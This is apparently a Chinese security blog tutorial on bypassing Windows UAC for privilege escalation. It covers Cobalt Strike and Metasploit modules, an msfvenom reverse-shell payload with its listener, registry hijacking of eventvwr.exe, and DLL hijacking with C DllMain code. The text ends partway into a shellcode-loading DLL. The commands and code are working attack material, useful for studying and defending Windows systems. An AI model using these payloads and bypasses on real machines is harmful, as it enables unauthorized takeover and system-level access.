

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="r1">
  <meta name="keywords" content="">
  
    <meta name="description" content="绕过UAC提权UAC概述UAC（User Account Control），中文翻译为用户帐户控制，是微软在Windows Vista和Windows7中 引用的新技术，主要功能是进行一些会影响系统安全的操作时，会自动触发UAC，用户确认后才能执行。因为大部分的恶意软件、木马病毒、广告插件在进入计算机时都会有如：将文件复制到Windows或 Program Files等目录、安装驱动、安装Acti">
<meta property="og:type" content="article">
<meta property="og:title" content="提权-windows绕过UAC提权">
<meta property="og:url" content="http://example.com/2024/01/09/%E6%8F%90%E6%9D%83-windows%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="r1ckyL&#39;s secret">
<meta property="og:description" content="绕过UAC提权UAC概述UAC（User Account Control），中文翻译为用户帐户控制，是微软在Windows Vista和Windows7中 引用的新技术，主要功能是进行一些会影响系统安全的操作时，会自动触发UAC，用户确认后才能执行。因为大部分的恶意软件、木马病毒、广告插件在进入计算机时都会有如：将文件复制到Windows或 Program Files等目录、安装驱动、安装Acti">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/image-20240109113933997.png">
<meta property="og:image" content="http://example.com/img/image-20240109114013972.png">
<meta property="og:image" content="http://example.com/img/image-20240109114330678.png">
<meta property="og:image" content="http://example.com/img/image-20240109143102510.png">
<meta property="og:image" content="http://example.com/img/image-20240109143232503.png">
<meta property="og:image" content="http://example.com/img/image-20240109143349971.png">
<meta property="og:image" content="http://example.com/img/image-20240109143422211.png">
<meta property="og:image" content="http://example.com/img/image-20240109143626947.png">
<meta property="og:image" content="http://example.com/img/image-20240109144219683.png">
<meta property="og:image" content="http://example.com/img/image-20240109144241028.png">
<meta property="og:image" content="http://example.com/img/image-20240109144549237.png">
<meta property="og:image" content="http://example.com/img/image-20240109144801842.png">
<meta property="og:image" content="http://example.com/img/image-20240109145007913.png">
<meta property="og:image" content="http://example.com/img/image-20240109145205157.png">
<meta property="og:image" content="http://example.com/img/image-20240109151353772.png">
<meta property="og:image" content="http://example.com/img/image-20240109151742393.png">
<meta property="og:image" content="http://example.com/img/image-20240109151817727.png">
<meta property="og:image" content="http://example.com/img/image-20240109152150132.png">
<meta property="og:image" content="http://example.com/img/image-20240109152835067.png">
<meta property="og:image" content="http://example.com/img/image-20240109153222732.png">
<meta property="og:image" content="http://example.com/img/image-20240109153332508.png">
<meta property="og:image" content="http://example.com/img/image-20240109153316717.png">
<meta property="og:image" content="http://example.com/img/image-20240109155435105.png">
<meta property="og:image" content="http://example.com/img/image-20240109160009574.png">
<meta property="og:image" content="http://example.com/img/image-20240109161528487.png">
<meta property="og:image" content="http://example.com/img/image-20240109161639947.png">
<meta property="og:image" content="http://example.com/img/image-20240109161707749.png">
<meta property="og:image" content="http://example.com/img/image-20240109161721029.png">
<meta property="og:image" content="http://example.com/img/image-20240109162012993.png">
<meta property="og:image" content="http://example.com/img/image-20240109162402874.png">
<meta property="og:image" content="http://example.com/img/image-20240109162520282.png">
<meta property="og:image" content="http://example.com/img/image-20240109164353457.png">
<meta property="og:image" content="http://example.com/img/image-20240109164626095.png">
<meta property="og:image" content="http://example.com/img/image-20240109165035918.png">
<meta property="og:image" content="http://example.com/img/image-20240109165046377.png">
<meta property="og:image" content="http://example.com/img/image-20240109165054622.png">
<meta property="og:image" content="http://example.com/img/image-20240109165122619.png">
<meta property="og:image" content="http://example.com/img/image-20240109165305489.png">
<meta property="og:image" content="http://example.com/img/image-20240109165351626.png">
<meta property="og:image" content="http://example.com/img/image-20240109165408677.png">
<meta property="og:image" content="http://example.com/img/image-20240109171055577.png">
<meta property="og:image" content="http://example.com/img/image-20240109171333051.png">
<meta property="og:image" content="http://example.com/img/image-20240109171632734.png">
<meta property="og:image" content="http://example.com/img/image-20240109171921843.png">
<meta property="og:image" content="http://example.com/img/image-20240109171949167.png">
<meta property="og:image" content="http://example.com/img/image-20240109171957626.png">
<meta property="article:published_time" content="2024-01-09T09:25:12.000Z">
<meta property="article:modified_time" content="2024-01-09T09:25:45.946Z">
<meta property="article:author" content="r1">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/image-20240109113933997.png">
  
  
  
  <title>提权-windows绕过UAC提权 - r1ckyL&#39;s secret</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VM6iIPhII9dNKYvDTSfaQlfY-MdYXbMMI","app_key":"ji1dPD8DG5BrS1OfKrqzGDUL","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>r1ckyL</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="提权-windows绕过UAC提权"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-01-09 17:25" pubdate>
          2024年1月9日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.2k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          60 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">提权-windows绕过UAC提权</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h1><h2 id="UAC概述"><a href="#UAC概述" class="headerlink" title="UAC概述"></a>UAC概述</h2><p>UAC（User Account Control），中文翻译为用户帐户控制，是微软在Windows Vista和Windows7中 引用的新技术，<strong>主要功能是进行一些会影响系统安全的操作时，会自动触发UAC，用户确认后才能执行</strong>。因为大部分的恶意软件、木马病毒、广告插件在进入计算机时都会有如：将文件复制到Windows或 Program Files等目录、安装驱动、安装ActiveX等操作，而这些操作都会触发UAC，用户都可以在UAC 提示时来禁止这些程序的运行</p>
<p><strong>许可提示</strong>当用户尝试执行需要用户管理访问令牌的任务时，会显示同意提示。 下面是 UAC 同意提示的示例</p>
<img src="/img/image-20240109113933997.png" srcset="/img/loading.gif" lazyload alt="image-20240109113933997" style="zoom:80%;" /> 

<p><strong>凭据提示</strong>当标准用户尝试执行需要用户管理访问令牌的任务时，会显示凭据提示。 还可以要求管理员提供其凭据</p>
<img src="/img/image-20240109114013972.png" srcset="/img/loading.gif" lazyload alt="image-20240109114013972" style="zoom:67%;" /> 

<h3 id="UAC触发操作"><a href="#UAC触发操作" class="headerlink" title="UAC触发操作"></a>UAC触发操作</h3><p>UAC触发的条件如下</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata">修改Windows <span class="hljs-keyword">Update</span>配置；<br>增加或删除用户帐户；<br>改变用户的帐户类型；<br>改变UAC设置；<br>安装ActiveX；<br>安装或卸载程序；<br>安装设备驱动程序；<br>修改和设置家长控制；<br>增加或修改注册表；<br>将文件移动或复制到<span class="hljs-keyword">Program</span> Files或是Windows目录；<br>访问其他用户目录<br></code></pre></td></tr></table></figure>

<p>UAC有用四种设置要求</p>
<p>简单来说，UAC设置分四种，分为始终通知、仅在程序尝试对我的计算机进行更改时通知我、仅当程序尝试更改计算机时通知我（不降低桌面亮度）和从不通知。</p>
<p>输入W+R –msconfig 设置UAC</p>
<p><img src="/img/image-20240109114330678.png" srcset="/img/loading.gif" lazyload alt="image-20240109114330678"> </p>
<h2 id="MSF和CS绕过UAC的方法"><a href="#MSF和CS绕过UAC的方法" class="headerlink" title="MSF和CS绕过UAC的方法"></a>MSF和CS绕过UAC的方法</h2><h3 id="CS绕过UAC"><a href="#CS绕过UAC" class="headerlink" title="CS绕过UAC"></a>CS绕过UAC</h3><p>拿到一个普通管理员的SHELL,在CS中没有*号代表有UAC</p>
<p><img src="/img/image-20240109143102510.png" srcset="/img/loading.gif" lazyload alt="image-20240109143102510"></p>
<p>使用CS自带的插件进行绕过</p>
<p><img src="/img/image-20240109143232503.png" srcset="/img/loading.gif" lazyload alt="image-20240109143232503"> </p>
<p>成功绕过UAC</p>
<p><img src="/img/image-20240109143349971.png" srcset="/img/loading.gif" lazyload alt="image-20240109143349971"></p>
<p>对比 ：</p>
<p>没有提权前，是没有权限的</p>
<p><img src="/img/image-20240109143422211.png" srcset="/img/loading.gif" lazyload alt="image-20240109143422211"> </p>
<p>提权后：</p>
<p><img src="/img/image-20240109143626947.png" srcset="/img/loading.gif" lazyload alt="image-20240109143626947"> </p>
<h3 id="MSF绕过UAC"><a href="#MSF绕过UAC" class="headerlink" title="MSF绕过UAC"></a>MSF绕过UAC</h3><h4 id="bypassuac模块"><a href="#bypassuac模块" class="headerlink" title="bypassuac模块"></a>bypassuac模块</h4><p>使用该模块提权的使用，当前用户必须是管理员组中的用户，UAC为默认设置 </p>
<p>生成一个MSF的SHELL</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span> LPORT=<span class="hljs-number">4567</span> -f exe -o payload.exe <span class="hljs-regexp">//</span>生成木马<br><br>use exploit<span class="hljs-regexp">/multi/</span>handler<br>set payload windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br>set lhost <span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span><br>set lport <span class="hljs-number">4567</span><br>exploit<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20240109144219683.png" srcset="/img/loading.gif" lazyload alt="image-20240109144219683"> </p>
<p>试一下getsystem发现失败</p>
<p><img src="/img/image-20240109144241028.png" srcset="/img/loading.gif" lazyload alt="image-20240109144241028"></p>
<p>搜索bypassuac模块</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20240109144549237.png" srcset="/img/loading.gif" lazyload alt="image-20240109144549237"></p>
<p>尝试用第二个，设置参数 session然后run即可</p>
<p>getsystem</p>
<p><img src="/img/image-20240109144801842.png" srcset="/img/loading.gif" lazyload alt="image-20240109144801842"></p>
<h4 id="RUNAS模块"><a href="#RUNAS模块" class="headerlink" title="RUNAS模块"></a>RUNAS模块</h4><p>该模块会创建一个可执行文件，目标机器会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择继续运行程序，就会返回一个system权限的shell</p>
<p>这个模块对用户没有要求，点击通过即可，但是会创建一个恶意文件，对该文件进行免杀即可</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>local/ask<br></code></pre></td></tr></table></figure>

<p>设置session然后run，目标机器会出现弹窗</p>
<p><img src="/img/image-20240109145007913.png" srcset="/img/loading.gif" lazyload alt="image-20240109145007913"> </p>
<p>点击确定即可上线</p>
<p><img src="/img/image-20240109145205157.png" srcset="/img/loading.gif" lazyload alt="image-20240109145205157"></p>
<h2 id="基于白名单AutoElevate绕过UAC"><a href="#基于白名单AutoElevate绕过UAC" class="headerlink" title="基于白名单AutoElevate绕过UAC"></a>基于白名单AutoElevate绕过UAC</h2><h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p><strong>利用白名单程序的本质实际上是劫持注册表,这种方法主要是通过寻找autoElevated属性为true的程序, 修改其注册表command的值,改成我们想要执行的paylaod</strong>,在该值中指明的字段会在这类程序运行时自动执行,类似于默认程序打开,当你以后运行该程序时,这个command命令都会自动执行。 </p>
<p>UAC同样也会对系统本身的程序造成影响，微软也不希望运行系统程序也需要询问用户，因为系统程序 是安全的。因此，微软则在 UAC 中添加了白名单机制常见白名单如下</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msconfig<span class="hljs-selector-class">.exe</span><br>taskmgr<span class="hljs-selector-class">.exe</span><br>perfmon<span class="hljs-selector-class">.exe</span><br>cleanmgr<span class="hljs-selector-class">.exe</span><br>sdclt<span class="hljs-selector-class">.exe</span><br>dccw<span class="hljs-selector-class">.exe</span><br>eventvwr<span class="hljs-selector-class">.exe</span><br>computerdefaults<span class="hljs-selector-class">.exe</span><br>fodhelper.exe<br></code></pre></td></tr></table></figure>

<h3 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h3><p>我们在win7的系统下运行eventvwr.exe，使用Process Monitor监控该程序，发现 HKCU\Software\Classes\mscfile\shell\open\command 的值结果是没发现</p>
<p><img src="/img/image-20240109151353772.png" srcset="/img/loading.gif" lazyload alt="image-20240109151353772"></p>
<p>由于这些注册表项不存在，用户可以在注册表中创建此结构，以便绕过用户账户控制 (UAC) 执行具有更 高权限的命令。</p>
<p><img src="/img/image-20240109151742393.png" srcset="/img/loading.gif" lazyload alt="image-20240109151742393"></p>
<p>再次运行eventvwr.exe弹出计算机</p>
<p><strong><img src="/img/image-20240109151817727.png" srcset="/img/loading.gif" lazyload alt="image-20240109151817727"></strong></p>
<p>也可以在命令行中执行添加操作（第二条最好添加上，不然可能不成功）：</p>
<p><img src="/img/image-20240109152150132.png" srcset="/img/loading.gif" lazyload alt="image-20240109152150132"></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span> /<span class="hljs-keyword">ve</span> /t REG_SZ /d <span class="hljs-string">&quot;cmd.exe /c calc&quot;</span><br><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span> /v DelegateExecute /t REG_SZ<br></code></pre></td></tr></table></figure>

<p>这虽然看起了还是普通用户，<strong>但是已经绕过了UAC可以执行命令了</strong>，接下来利用powershell控制台打开 cmd添加用户或者启用administrator，然后使用runas进行权限切换到administrator</p>
<h4 id="CS演示"><a href="#CS演示" class="headerlink" title="CS演示"></a>CS演示</h4><p><img src="/img/image-20240109152835067.png" srcset="/img/loading.gif" lazyload alt="image-20240109152835067"></p>
<p>修改注册表</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span> /<span class="hljs-keyword">ve</span> /t REG_SZ /d <span class="hljs-string">&quot;C:\Users\r1cky\Desktop\artifact.exe&quot;</span><br><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span> /v DelegateExecute /t REG_SZ<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20240109153222732.png" srcset="/img/loading.gif" lazyload alt="image-20240109153222732"></p>
<p>执行eventvwr.exe成功绕过uac</p>
<p><img src="/img/image-20240109153332508.png" srcset="/img/loading.gif" lazyload alt="image-20240109153332508"> </p>
<p><img src="/img/image-20240109153316717.png" srcset="/img/loading.gif" lazyload alt="image-20240109153316717"></p>
<h2 id="基于白名单DLL劫持绕过UAC提权"><a href="#基于白名单DLL劫持绕过UAC提权" class="headerlink" title="基于白名单DLL劫持绕过UAC提权"></a>基于白名单DLL劫持绕过UAC提权</h2><h3 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h3><h4 id="DLL是什么"><a href="#DLL是什么" class="headerlink" title="DLL是什么"></a>DLL是什么</h4><p>dll为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中许多应用程序并不是一个 完整的可执行文件，它们被分割成一些相对独立的动态链接库文件，即dll文件，放置于系统中，个人理 解类似于我们编程中引入的模块</p>
<h4 id="DLL提权原理"><a href="#DLL提权原理" class="headerlink" title="DLL提权原理"></a>DLL提权原理</h4><p><strong>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这 个DLL；</strong></p>
<p>如果<strong>攻击者能够控制其中的某一个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意 的DLL便会被进程所加载，从而造成代码执行</strong>。这就是所谓的DLL劫持</p>
<p>DLL的加载顺序如下</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">1</span>、应用程序加载的目录<br><span class="hljs-number">2</span>、C:<span class="hljs-string">\Windows\System32</span><br><span class="hljs-number">3</span>、C:<span class="hljs-string">\Windows\System</span><br><span class="hljs-number">4</span>、C:<span class="hljs-string">\Windows</span><br><span class="hljs-number">5.</span>加载 DLL 时所在的当前目录<br><span class="hljs-number">6.</span>PATH环境变量中列出的目录<br></code></pre></td></tr></table></figure>

<h3 id="Know-Dlls注册表项"><a href="#Know-Dlls注册表项" class="headerlink" title="Know Dlls注册表项"></a>Know Dlls注册表项</h3><p>从windows7之后，微软为了更进一步的防御系统的dll劫持，将一些容易被劫持的系统dll写进了一个注册表项中，那么凡<strong>是在此项目下的dll文件就会被禁止从exe自身所在目录下调用，而只能从系统目录即 system32目录下调用</strong></p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20240109155435105.png" srcset="/img/loading.gif" lazyload alt="image-20240109155435105"></p>
<h3 id="提权环境"><a href="#提权环境" class="headerlink" title="提权环境"></a>提权环境</h3><p>当前采用win7系统，找到一个白名单的程序 SystemPropertiesAdvanced.exe 位置在 C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 目录下，打开如下是windows的属性设置，通过进程监控找到加载的DLL文件进行劫持就可以提权</p>
<p>打开不需要uac认证</p>
<p><img src="/img/image-20240109160009574.png" srcset="/img/loading.gif" lazyload alt="image-20240109160009574"></p>
<p>先将操作在本地执行，使用process monitor进行监控，过滤DLL和 NAME NOT FOUND ，寻找可以替换的DLL 文件，注意文件的权限是否可以在目录写入，</p>
<p>可以看到在C盘的tools目录的jdk文件中有一个srrstr.dll被 调用，但是没有加载，我们生成恶意的DLL文件看看是否可以被劫持</p>
<p><img src="/img/image-20240109161528487.png" srcset="/img/loading.gif" lazyload alt="image-20240109161528487"></p>
<p>打开C语言编辑器生成DLL文件，进行弹出CMD窗口，或者打开计算器进行测试CPP文件内容如下</p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-comment">/* Replace &quot;dll.h&quot; with the name of your header */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dll.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;windows.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;stdlib.h&gt;</span><br>BOOL WINAPI DllMain(<span class="hljs-keyword">HINSTANCE</span> hinstDLL,DWORD fdwReason,LPVOID lpvReserved)<br>&#123;<br><span class="hljs-keyword">switch</span>(fdwReason)<br>&#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>)<span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>&#123;<br><span class="hljs-keyword">break</span><span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>&#123;<br><span class="hljs-keyword">break</span><span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>&#123;<br><span class="hljs-keyword">break</span><span class="hljs-comment">;</span><br>&#125;<br>&#125;<br><span class="hljs-comment">/* Return TRUE on success, FALSE on failure */</span><br><span class="hljs-keyword">return</span> TRUE<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20240109161639947.png" srcset="/img/loading.gif" lazyload alt="image-20240109161639947"></p>
<p>生成DLL文件并且，传到 C:\tools\jdk-11.0.11\bin\srrstr.dll 目录下，看看是否能劫持，并且绕 过UAC</p>
<img src="/img/image-20240109161707749.png" srcset="/img/loading.gif" lazyload alt="image-20240109161707749" style="zoom:80%;" />  

<p><img src="/img/image-20240109161721029.png" srcset="/img/loading.gif" lazyload alt="image-20240109161721029"> </p>
<h3 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>利用CS上线进行劫持DLL提权绕过UAC认证</p>
<p>首先上线CS</p>
<p>使用CS生成shellcode，并且加载到DLL文件中，上传到目标系统中加载的代码如下</p>
<p><img src="/img/image-20240109162012993.png" srcset="/img/loading.gif" lazyload alt="image-20240109162012993"> </p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">/* Replace &quot;dll.h&quot; with the name of your header */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dll.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>HANDLE hThread = 